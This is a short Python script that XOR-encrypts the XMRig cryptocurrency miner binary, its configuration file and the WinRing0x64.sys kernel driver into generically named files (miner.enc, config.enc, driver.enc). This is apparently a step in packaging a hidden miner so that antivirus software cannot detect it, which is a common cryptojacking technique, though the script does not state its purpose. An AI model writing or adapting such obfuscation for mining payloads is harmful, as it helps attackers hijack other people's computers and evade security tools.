#!/usr/bin/env python3
import sys

key = 0x5A

# Encrypt xmrig.exe
with open('xmrig-6.24.0/xmrig.exe', 'rb') as f:
    data = f.read()
encrypted = bytes([b ^ key for b in data])
with open('miner.enc', 'wb') as f:
    f.write(encrypted)
print(f'✅ Encrypted xmrig.exe: {len(encrypted)} bytes → miner.enc')

# Encrypt config.json
with open('xmrig-6.24.0/config.json', 'rb') as f:
    data = f.read()
encrypted = bytes([b ^ key for b in data])
with open('config.enc', 'wb') as f:
    f.write(encrypted)
print(f'✅ Encrypted config.json: {len(encrypted)} bytes → config.enc')

# Also encrypt WinRing0x64.sys (driver needed for performance)
with open('xmrig-6.24.0/WinRing0x64.sys', 'rb') as f:
    data = f.read()
encrypted = bytes([b ^ key for b in data])
with open('driver.enc', 'wb') as f:
    f.write(encrypted)
print(f'✅ Encrypted WinRing0x64.sys: {len(encrypted)} bytes → driver.enc')
